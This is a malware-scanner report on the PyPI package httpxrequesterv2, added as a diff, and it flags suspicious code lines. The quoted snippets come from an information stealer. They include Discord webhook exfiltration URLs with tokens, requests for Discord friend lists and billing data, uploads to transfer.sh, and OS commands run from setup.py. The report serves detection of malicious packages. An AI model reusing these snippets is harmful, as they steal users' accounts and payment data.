@@ -1,0 +1,95 @@
+{
+    "issues": 15,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": [
+            {
+                "location": "httpxrequesterv2/main.py:21",
+                "code": "hook='https://discord.com/api/webhooks/1068790168787619853/GGPAQA90Vj_g0WELns2ePZf1pjGk8xBZukXG2NIr5POBkAtvKgycLQua45UddvzJfHXq'\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "httpxrequesterv2/main.py:26",
+                "code": "        ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "httpxrequesterv2/main.py:128",
+                "code": "        friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "httpxrequesterv2/main.py:150",
+                "code": "        billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "httpxrequesterv2/main.py:574",
+                "code": "        upload=requests.post('https://transfer.sh/',files=files)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "httpxrequesterv2/main.py:659",
+                "code": "    'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[i...lix.com)'\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:21",
+                "code": "hook='https://discord.com/api/webhooks/1068834530145882123/Wpftx2uFAqFv_LFyyf4KruVm3jScMuK1ylgJ_rVt_koH32oIjN3dZYksvYTTGRXqV5k1'\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:26",
+                "code": "        ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:128",
+                "code": "        friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:150",
+                "code": "        billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:574",
+                "code": "        upload=requests.post('https://transfer.sh/',files=files)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:659",
+                "code": "    'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[i...lix.com)'\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": [
+            {
+                "location": "setup.py:3",
+                "code": "exec('')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:37",
+                "code": "        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\",shell=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:497",
+                "code": "    subprocess.Popen(f\"taskkill /im {procc} /t /f\",shell=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/httpxrequesterv2-1.0"
+}
